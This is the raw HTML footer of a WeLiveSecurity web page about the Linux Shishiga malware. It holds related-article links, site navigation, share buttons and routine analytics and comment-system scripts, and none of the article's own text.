                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="Linux Shishiga malware using LUA scripts">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/exchange-servers-under-siege-10-apt-groups-623x432.jpg"
                                                         alt="Linux Shishiga malware using LUA scripts">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/">
                                                    Exchange servers under siege from at least 10 APT groups                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/apple-m1-macs-malware-1-623x432.jpg"
                                                         alt="Linux Shishiga malware using LUA scripts">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/">
                                                    Malware authors already taking aim at Apple M1 Macs                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/eset-kobalos-hpc-high-performance-computing-malware-research-623x432.jpg"
                                                         alt="Linux Shishiga malware using LUA scripts">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/">
                                                    Kobalos – A complex Linux threat to high performance computing infrastructure                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F04%2F25%2Flinux-shishiga-malware-using-lua-scripts%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F04%2F25%2Flinux-shishiga-malware-using-lua-scripts%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F04%2F25%2Flinux-shishiga-malware-using-lua-scripts%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"91978 https:\/\/ba-infohub-web01-v.hq.eset.com\/?p=91978","disqusShortname":"welivesecurity","disqusTitle":"Linux Shishiga malware using LUA scripts","disqusUrl":"https:\/\/www.welivesecurity.com\/2017\/04\/25\/linux-shishiga-malware-using-lua-scripts\/","postId":"91978"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>